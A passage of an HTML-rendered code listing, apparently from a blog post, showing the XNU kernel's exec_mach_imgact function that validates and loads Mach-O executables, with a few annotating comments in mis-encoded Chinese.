class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div></pre></td><td class="code"><pre><div class="line">static int</div><div class="line">exec_mach_imgact(struct image_params *imgp)</div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="title">struct</span> mach_header *mach_header = (struct mach_header *)imgp-&gt;</span>ip_vdata;</div><div class="line">	<span class="function"><span class="title">proc_t</span>			p = vfs_context_proc(imgp-&gt;</span>ip_vfs_context);</div><div class="line">	int			error = <span class="number">0</span>;</div><div class="line">	task_t			task;</div><div class="line">	task_t			new_task = NULL; <span class="comment">/* protected by vfexec */</span></div><div class="line">	thread_t		thread;</div><div class="line">	struct uthread		*uthread;</div><div class="line">	vm_map_t old_map = VM_MAP_NULL;</div><div class="line">	vm_map_t map;</div><div class="line">	load_return_t		lret;</div><div class="line">	load_result_t		load_result;</div><div class="line">	struct _posix_spawnattr *psa = NULL;</div><div class="line">	<span class="function"><span class="title">int</span>			spawn = (imgp-&gt;</span>ip_flags &amp; IMGPF_SPAWN);</div><div class="line">	<span class="function"><span class="title">int</span>			vfexec = (imgp-&gt;</span>ip_flags &amp; IMGPF_VFORK_EXEC);</div><div class="line">	int			p_name_len;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * make sure it's a Mach-O 1.0 or Mach-O 2.0 binary; the difference</div><div class="line">	 * is a reserved field on the end, so for the most part, we can</div><div class="line">	 * treat them as if they were identical. Reverse-endian Mach-O</div><div class="line">	 * binaries are recognized but not compatible.</div><div class="line"> 	 */</div><div class="line"><span class="comment">//æ£€æµ‹headerä¸­çš„magicæ¥ç¡®å®šæ˜¯å¦ç¬¦åˆMach-Oçš„æ¡ä»¶</span></div><div class="line">	<span class="function"><span class="title">if</span> ((mach_header-&gt;</span>magic == MH_CIGAM) ||</div><div class="line">	    (<span class="function"><span class="title">mach_header</span>-&gt;</span>magic == MH_CIGAM_64)) &#123;</div><div class="line">		error = EBADARCH;</div><div class="line">		goto bad;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="title">if</span> ((mach_header-&gt;</span>magic != MH_MAGIC) &amp;&amp;</div><div class="line">	    (<span class="function"><span class="title">mach_header</span>-&gt;</span>magic != MH_MAGIC_64)) &#123;</div><div class="line">		error = -<span class="number">1</span>;</div><div class="line">		goto bad;</div><div class="line">	&#125;</div><div class="line"><span class="comment">//æ£€æµ‹headerä¸­çš„æ–‡ä»¶ç±»å‹ä¸”å¿…é¡»ä¸ºå¯æ‰§è¡Œæ–‡ä»¶</span></div><div class="line">	<span class="function"><span class="title">if</span> (mach_header-&gt;</span>filetype != MH_EXECUTE) &#123;</div><div class="line">		error = -<span class="number">1</span>;</div><div class="line">		goto bad;</div><div class="line">	&#125;</div><div class="line"><span class="comment">//æ£€æµ‹Mach-Oæ–‡ä»¶çš„CPUç§ç±»ä¸ç‰ˆæœ¬</span></div><div class="line">	<span class="function"><span class="title">if</span> (imgp-&gt;</span>ip_origcputype != <span class="number">0</span>) &#123;</div><div class="line">		<span class="comment">/* Fat header previously had an idea about this thin file */</span></div><div class="line">		<span class="function"><span class="title">if</span> (imgp-&gt;</span><span class="function"><span class="title">ip_origcputype</span> != mach_header-&gt;</span>cputype ||</div><div class="line">			<span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_origcpusubtype</span> != mach_header-&gt;</span>cpusubtype) &#123;</div><div class="line">			error = EBADARCH;</div><div class="line">			goto bad;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_origcputype</span> = mach_header-&gt;</span>cputype;</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_origcpusubtype</span> = mach_header-&gt;</span>cpusubtype;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	task = current_task();</div><div class="line">	thread = current_thread();</div><div class="line">	uthread = get_bsdthread_info(thread);</div><div class="line"></div><div class="line">	<span class="function"><span class="title">if</span> ((mach_header-&gt;</span>cputype &amp; CPU_ARCH_ABI64) == CPU_ARCH_ABI64)</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span>ip_flags |= IMGPF_IS_64BIT;</div><div class="line"></div><div class="line">	<span class="comment">/* If posix_spawn binprefs exist, respect those prefs. */</span></div><div class="line">	<span class="function"><span class="title">psa</span> = (struct _posix_spawnattr *) imgp-&gt;</span>ip_px_sa;</div><div class="line">	<span class="function"><span class="title">if</span> (psa != NULL &amp;&amp; psa-&gt;</span>psa_binprefs[<span class="number">0</span>] != <span class="number">0</span>) &#123;</div><div class="line">		int pr = <span class="number">0</span>;</div><div class="line">		<span class="keyword">for</span> (pr = <span class="number">0</span>; pr &lt; NBINPREFS; pr++) &#123;</div><div class="line">			<span class="function"><span class="title">cpu_type_t</span> pref = psa-&gt;</span>psa_binprefs[pr];</div><div class="line">			<span class="keyword">if</span> (pref == <span class="number">0</span>) &#123;</div><div class="line">				<span class="comment">/* No suitable arch in the pref list */</span></div><div class="line">				error = EBADARCH;</div><div class="line">				goto bad;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="keyword">if</span> (pref == CPU_TYPE_ANY) &#123;</div><div class="line">				<span class="comment">/* Jump to regular grading */</span></div><div class="line">				goto grade;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="function"><span class="title">if</span> (pref == imgp-&gt;</span>ip_origcputype) &#123;</div><div class="line">				<span class="comment">/* We have a match! */</span></div><div class="line">				goto grade;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		error = EBADARCH;</div><div class="line">		goto bad;</div><div class="line">	&#125;</div><div class="line">grade:</div><div class="line">	<span class="function"><span class="title">if</span> (!grade_binary(imgp-&gt;</span><span class="function"><span class="title">ip_origcputype</span>, imgp-&gt;</span>ip_origcpusubtype &amp; ~CPU_SUBTYPE_MASK)) &#123;</div><div class="line">		error = EBADARCH;</div><div class="line">		goto bad;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/* Copy in arguments/environment from the old process */</span></div><div class="line">	error = exec_extract_strings(imgp);</div><div class="line">	<span class="keyword">if</span> (error)</div><div class="line">		goto bad;</div><div class="line"></div><div class="line">	error = exec_add_apple_strings(imgp);</div><div class="line">	<span class="keyword">if</span> (error)</div><div class="line">		goto bad;</div><div class="line"></div><div class="line">	AUDIT_ARG(<span class="function"><span class="title">argv</span>, imgp-&gt;</span><span class="function"><span class="title">ip_startargv</span>, imgp-&gt;</span>ip_argc, </div><div class="line">	    <span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_endargv</span> - imgp-&gt;</span>ip_startargv);</div><div class="line">	AUDIT_ARG(<span class="function"><span class="title">envv</span>, imgp-&gt;</span><span class="function"><span class="title">ip_endargv</span>, imgp-&gt;</span>ip_envc,</div><div class="line">	    <span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_endenvv</span> - imgp-&gt;</span>ip_endargv);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * We are being called to activate an image subsequent to a vfork()</div><div class="line">	 * operation; in this case, we know that our task, thread, and</div><div class="line">	 * uthread are actually those of our parent, and our proc, which we</div><div class="line">	 * obtained indirectly from the image_params vfs_context_t, is the</div><div class="line">	 * new child process.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> (vfexec || spawn) &#123;</div><div class="line">		<span class="keyword">if</span> (vfexec) &#123;</div><div class="line">			<span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_new_thread</span> = fork_create_child(task, NULL, p, FALSE, (imgp-&gt;</span>ip_flags &amp; IMGPF_IS_64BIT));</div><div class="line">			<span class="function"><span class="title">if</span> (imgp-&gt;</span>ip_new_thread == NULL) &#123;</div><div class="line">				error = ENOMEM;</div><div class="line">				goto bad;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">/* reset local idea of thread, uthread, task */</span></div><div class="line">		<span class="function"><span class="title">thread</span> = imgp-&gt;</span>ip_new_thread;</div><div class="line">		uthread = get_bsdthread_info(thread);</div><div class="line">		task = new_task = get_threadtask(thread);</div><div class="line">		map = get_task_map(task);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		map = VM_MAP_NULL;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * We set these flags here; this is OK, since if we fail after</div><div class="line">	 * this point, we have already destroyed the parent process anyway.</div><div class="line">	 */</div><div class="line">	task_set_dyld_info(task, MACH_VM_MIN_ADDRESS, <span class="number">0</span>);</div><div class="line">	<span class="function"><span class="title">if</span> (imgp-&gt;</span>ip_flags &amp; IMGPF_IS_64BIT) &#123;</div><div class="line">		task_set_64bit(task, TRUE);</div><div class="line">		OSB<span class="function"><span class="title">itOrAtomic</span>(P_LP64, &amp;p-&gt;</span>p_flag);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		task_set_64bit(task, FALSE);</div><div class="line">		OSB<span class="function"><span class="title">itAndAtomic</span>(~((uint32_t)P_LP64), &amp;p-&gt;</span>p_flag);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 *	Load the Mach-O file.</div><div class="line">	 *</div><div class="line">	 * <span class="doctag">NOTE:</span> An error after this point  indicates we have potentially</div><div class="line">	 * destroyed or overwritten some process state while attempting an</div><div class="line">	 * execve() following a vfork(), which is an unrecoverable condition.</div><div class="line">	 * We send the new process an immediate SIGKILL to avoid it executing</div><div class="line">	 * any instructions in the mutated address space. For true spawns,</div><div class="line">	 * this is not the case, and "too late" is still not too late to</div><div class="line">	 * return an error code to the parent process.</div><div class="line">	 */</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Actually load the image file we previously decided to load.</div><div class="line">	 */</div><div class="line"><span class="comment">//æŠŠMach-Oæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­å¹¶è°ƒç”¨load_machfileå‡½æ•°</span></div><div class="line">	lret = load_machfile(imgp, mach_header, thread, &amp;map, &amp;load_result);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (lret != LOAD_SUCCESS) &#123;</div><div class="line">		error = load_return_to_errno(lret);</div><div class="line">		goto badtoolate;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	proc_lock(p);</div><div class="line">	<span class="function"><span class="title">p</span>-&gt;</span><span class="function"><span class="title">p_cputype</span> = imgp-&gt;</span>ip_origcputype;</div><div class="line">	<span class="function"><span class="title">p</span>-&gt;</span><span class="function"><span class="title">p_cpusubtype</span> = imgp-&gt;</span>ip_origcpusubtype;</div><div class="line">	proc_unlock(p);</div><div class="line"></div><div class="line">	<span class="function"><span class="title">vm_map_set_user_wire_limit</span>(map, p-&gt;</span>p_rlimit[RLIMIT_MEMLOCK].rlim_cur);</div><div class="line"></div><div class="line">	<span class="comment">/* </span></div><div class="line">	 * Set code-signing flags if this binary is signed, or if parent has</div><div class="line">	 * requested them on exec.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> (load_result.csflags &amp; CS_VALID) &#123;</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span>ip_csflags |= load_result.csflags &amp; </div><div class="line">			(CS_VALID|</div><div class="line">			 CS_HARD|CS_KILL|CS_RESTRICT|CS_ENFORCEMENT|CS_REQUIRE_LV|CS_DYLD_PLATFORM|</div><div class="line">			 CS_EXEC_SET_HARD|CS_EXEC_SET_KILL|CS_EXEC_SET_ENFORCEMENT);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span>ip_csflags &amp;= ~CS_VALID;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="title">if</span> (p-&gt;</span>p_csflags &amp; CS_EXEC_SET_HARD)</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span>ip_csflags |= CS_HARD;</div><div class="line">	<span class="function"><span class="title">if</span> (p-&gt;</span>p_csflags &amp; CS_EXEC_SET_KILL)</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span>ip_csflags |= CS_KILL;</div><div class="line">	<span class="function"><span class="title">if</span> (p-&gt;</span>p_csflags &amp; CS_EXEC_SET_ENFORCEMENT)</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span>ip_csflags |= CS_ENFORCEMENT;</div><div class="line">	<span class="function"><span class="title">if</span> (p-&gt;</span>p_csflags &amp; CS_EXEC_SET_INSTALLER)</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span>ip_csflags |= CS_INSTALLER;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Set up the system reserved areas in the new address space.</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">vm_map_exec</span>(map, task, (void *)p-&gt;</span><span class="function"><span class="title">p_fd</span>-&gt;</span>fd_rdir, cpu_type());</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Close file descriptors which specify close-on-exec.</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">fdexec</span>(p, psa != NULL ? psa-&gt;</span>psa_flags : <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * deal with set[ug]id.</div><div class="line">	 */</div><div class="line">	error = exec_handle_sugid(imgp);</div><div class="line">	<span class="keyword">if</span> (error) &#123;</div><div class="line">		<span class="keyword">if</span> (spawn || !vfexec) &#123;</div><div class="line">			vm_map_deallocate(map);</div><div class="line">		&#125;</div><div class="line">		goto badtoolate;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Commit to new map.</div><div class="line">	 *</div><div class="line">	 * Swap the new map for the old, which consumes our new map reference but</div><div class="line">	 * each leaves us responsible for the old_map reference.  That lets us get</div><div class="line">	 * off the pmap associated with it, and then we can release it.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> (!vfexec) &#123;</div><div class="line">		old_map = swap_task_map(task, thread, map, !spawn);</div><div class="line">		vm_map_deallocate(old_map);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	lret = activate_thread_state(thread, &amp;load_result);</div><div class="line">	<span class="keyword">if</span> (lret != KERN_SUCCESS) &#123;</div><div class="line">		goto badtoolate;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * deal with voucher on exec-calling thread.</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">if</span> (imgp-&gt;</span>ip_new_thread == NULL)</div><div class="line">		thread_set_mach_voucher(current_thread(), IPC_VOUCHER_NULL);</div><div class="line"></div><div class="line">	<span class="comment">/* Make sure we won't interrupt ourself signalling a partial process */</span></div><div class="line">	<span class="function"><span class="title">if</span> (!vfexec &amp;&amp; !spawn &amp;&amp; (p-&gt;</span>p_lflag &amp; P_LTRACED))</div><div class="line">		psignal(p, SIGTRAP);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (load_result.unixproc &amp;&amp;</div><div class="line">		create_unix_stack(get_task_map(task),</div><div class="line">				  &amp;load_result,</div><div class="line">				  p) != KERN_SUCCESS) &#123;</div><div class="line">		error = load_return_to_errno(LOAD_NOSPACE);</div><div class="line">		goto badtoolate;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (vfexec || spawn) &#123;</div><div class="line">		old_map = vm_map_switch(get_task_map(task));</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (load_result.unixproc) &#123;</div><div class="line">		user_addr_t	ap;</div><div class="line"></div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * Copy the strings area out into the new process address</div><div class="line">		 * space.</div><div class="line">		 */</div><div class="line">		<span class="function"><span class="title">ap</span> = p-&gt;</span>user_stack;</div><div class="line">		error = exec_copyout_strings(imgp, &amp;ap);</div><div class="line">		<span class="keyword">if</span> (error) &#123;</div><div class="line">			<span class="keyword">if</span> (vfexec || spawn)</div><div class="line">				vm_map_switch(old_map);</div><div class="line">			goto badtoolate;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">/* Set the stack */</span></div><div class="line">		thread_setuserstack(thread, ap);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (load_result.dynlinker) &#123;</div><div class="line">		uint64_t	ap;</div><div class="line">		<span class="function"><span class="title">int</span>			new_ptr_size = (imgp-&gt;</span>ip_flags &amp; IMGPF_IS_64BIT) ? <span class="number">8</span> : <span class="number">4</span>;</div><div class="line"></div><div class="line">		<span class="comment">/* Adjust the stack */</span></div><div class="line">		ap = thread_adjuserstack(thread, -new_ptr_size);</div><div class="line">		error = copyoutptr(load_result.mach_header, ap, new_ptr_size);</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (error) &#123;</div><div class="line">			<span class="keyword">if</span> (vfexec || spawn)</div><div class="line">				vm_map_switch(old_map);</div><div class="line">			goto badtoolate;</div><div class="line">		&#125;</div><div class="line">		<span class="comment">//ç”±dyldæ¥æ‰‹æ¥ä¸‹æ¥çš„å·¥ä½œ</span></div><div class="line">		task_set_dyld_info(task, load_result.all_image_info_addr,</div><div class="line">		    load_result.all_image_info_size);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/* Avoid immediate VM faults back into kernel */</span></div><div class="line">	exec_prefault_data(p, imgp, &amp;load_result);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (vfexec || spawn) &#123;</div><div class="line">		vm_map_switch(old_map);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/* Stop profiling */</span></div><div class="line">	stopprofclock(p);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Reset signal state.</div><div class="line">	 */</div><div class="line">	execsigs(p, thread);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * need to cancel async IO requests that can be cancelled and wait for those</div><div class="line">	 * already active.  MAY BLOCK!</div><div class="line">	 */</div><div class="line">	_aio_exec( p );</div><div class="line"></div><div class="line">#<span class="keyword">if</span> SYSV_SHM</div><div class="line">	<span class="comment">/* <span class="doctag">FIXME:</span> Till vmspace inherit is fixed: */</span></div><div class="line">	<span class="function"><span class="title">if</span> (!vfexec &amp;&amp; p-&gt;</span>vm_shm)</div><div class="line">		shmexec(p);</div><div class="line">#endif</div><div class="line">#<span class="keyword">if</span> SYSV_SEM</div><div class="line">	<span class="comment">/* Clean up the semaphores */</span></div><div class="line">	semexit(p);</div><div class="line">#endif</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Remember file name for accounting.</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">p</span>-&gt;</span>p_acflag &amp;= ~AFORK;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Set p-&gt;p_comm and p-&gt;p_name to the name passed to exec</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">p_name_len</span> = sizeof(p-&gt;</span>p_name) - <span class="number">1</span>;</div><div class="line">	<span class="function"><span class="title">if</span>(imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen &gt; p_name_len)</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen = p_name_len;</div><div class="line">	<span class="function"><span class="title">bcopy</span>((caddr_t)imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span><span class="function"><span class="title">ni_cnd</span>.cn_nameptr, (caddr_t)p-&gt;</span>p_name,</div><div class="line">		(<span class="function"><span class="title">unsigned</span>)imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen);</div><div class="line">	<span class="function"><span class="title">p</span>-&gt;</span><span class="function"><span class="title">p_name</span>[imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen] = <span class="string">'\0'</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="title">if</span> (imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen &gt; MAXCOMLEN)</div><div class="line">		<span class="function"><span class="title">imgp</span>-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen = MAXCOMLEN;</div><div class="line">	<span class="function"><span class="title">bcopy</span>((caddr_t)imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span><span class="function"><span class="title">ni_cnd</span>.cn_nameptr, (caddr_t)p-&gt;</span>p_comm,</div><div class="line">		(<span class="function"><span class="title">unsigned</span>)imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen);</div><div class="line">	<span class="function"><span class="title">p</span>-&gt;</span><span class="function"><span class="title">p_comm</span>[imgp-&gt;</span><span class="function"><span class="title">ip_ndp</span>-&gt;</span>ni_cnd.cn_namelen] = <span class="string">'\0'</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="title">pal_dbg_set_task_name</span>( p-&gt;</span>task );</div><div class="line"></div><div class="line">#<span class="keyword">if</span> DEVELOPMENT || DEBUG</div><div class="line">	<span class="comment">/* </span></div><div class="line">	 * Update the pid an proc name for importance base if any</div><div class="line">	 */</div><div class="line">	<span class="function"><span class="title">task_importance_update_owner_info</span>(p-&gt;</span>task);</div><div class="line">#endif</div><div class="line"></div><div class="line">	<span class="function"><span class="title">memcpy</span>(&amp;p-&gt;</span><span class="function"><span class="title">p_uuid</span>[0], &amp;load_result.uuid[0], sizeof(p-&gt;</span>p_uuid));</div><div class="line"></div><div class="line"><span class="comment">// &lt;rdar://6598155&gt; dtrace code cleanup needed</span></div><div class="line">#<span class="keyword">if</span> CONFIG_DTRACE</div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Invalidate any predicate evaluation already cached for this thread by DTrace.</div><div class="line">	 * That's because we've just stored to p_comm and DTrace refers to that when it</div><div class="line">	 * evaluates the "execname" special variable. uid and gid may have changed as well.</div><div class="line">	 */</div><div class="line">	dtrace_set_thread_predcache(current_thread(), <span class="number">0</span>);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Free any outstanding lazy dof entries. It is imperative we</div><div class="line">	 * always call dtrace_lazy_dofs_destroy, rather than null check</div><div class="line">	 * and call if !NULL. If we NULL test, during lazy dof faulting</div><div class="line">	 * we can race with the faulting code and proceed from here to</div><div class="line">	 * beyond the helpers cleanup. The lazy dof faulting will then</div><div class="line">	 * install new helpers which no longer belong to this process!</div><div class="line">	 */</div><div class="line">	dtrace_lazy_dofs_destroy(p);</div><div class="line"></div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">    	 * Clean up any DTrace helpers for the process.</div><div class="line">    	 */</div><div class="line">    	<span class="function"><span class="title">if</span> (p-&gt;</span>p_dtrace_helpers != NULL &amp;&amp; dtrace_helpers_cleanup) &#123;</div><div class="line">    		(*dtrace_helpers_cleanup)(p);</div><div class="line">    	&#125;</div><div class="line">	</div><div class="line">    	<span class="comment">/*</span></div><div class="line">    	 * Cleanup the DTrace provider associated with this process.</div><div class="line">    	 */</div><div class="line">	proc_lock(p);</div><div class="line">	<span class="function"><span class="title">if</span> (p-&gt;</span>p_dtrace_probes &amp;&amp; dtrace_fasttrap_exec_ptr) &#123;</div><div class="line">		(*dtrace_fasttrap_exec_ptr)(p);</div><div class="line">	&#125;</div><div class="line">	proc_unlock(p);</div><div class="line">#endif</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (kdebug_enable) &#123;</div><div class="line">		long dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4;</div><div class="line"></div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * Collect the pathname for tracing</div><div class="line">		 */</div><div class="line">		kdbg_trace_string(p, &amp;dbg_arg1, &amp;dbg_arg2, &amp;dbg_arg3, &amp;dbg_arg4);</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (vfexec || spawn) &#123;</div><div class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_DATA_EXEC | DBG_FUNC_NONE,</div><div class="line">					<span class="function"><span class="title">p</span>-&gt;</span>p_pid ,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>, (uintptr_t)thread_tid(thread));</div><div class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_STRING_EXEC | DBG_FUNC_NONE,</div><div class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, (uintptr_t)thread_tid(thread));</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			KERNEL_DEBUG_CONSTANT(TRACE_DATA_EXEC | DBG_FUNC_NONE,</div><div class="line">					<span class="function"><span class="title">p</span>-&gt;</span>p_pid ,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</div><div class="line">			KERNEL_DEBUG_CONSTANT(TRACE_STRING_EXEC | DBG_FUNC_NONE,</div><div class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, <span class="number">0</span>);</div><div 